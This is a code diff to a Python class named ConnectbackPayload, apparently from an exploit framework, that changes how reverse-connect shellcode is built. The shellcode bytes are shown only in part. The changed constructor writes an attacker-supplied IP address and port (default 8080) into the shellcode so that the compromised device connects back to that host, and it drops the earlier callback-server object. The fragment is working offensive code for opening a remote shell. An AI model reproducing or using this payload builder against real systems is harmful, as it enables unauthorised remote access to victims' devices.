@@ -118,23 +118,22 @@ class ConnectbackPayload:
         "\x01\x01\x01\x0c"  # syscall   0x40404
         ],'')
 
-    def __init__(self,callback_server,endianness):
-        callback_ip=callback_server.callback_ip
-        self.callback_pid=None
+    def __init__(self,connectback_ip,endianness,port=8080):
+        
+        self.connectback_pid=None
 
-        callback_port=int(callback_server.port)
+        port=int(port)
 
         shellcode=self.__class__.shellcodes[endianness]
         i = 0
-        for c in socket.inet_aton(callback_ip):
+        for c in socket.inet_aton(connectback_ip):
             shellcode = shellcode.replace("IP%d" % i, c)
             i+=1
 
-        shellcode = shellcode.replace("PORT1",chr(callback_port >> 8))
-        shellcode = shellcode.replace("PORT2",chr(callback_port & 0xFF))
+        shellcode = shellcode.replace("PORT1",chr(port >> 8))
+        shellcode = shellcode.replace("PORT2",chr(port & 0xFF))
 
         self.shellcode=shellcode
-        self.callback=callback_server
 
     def serve_connectback(self):
         #unimplemented
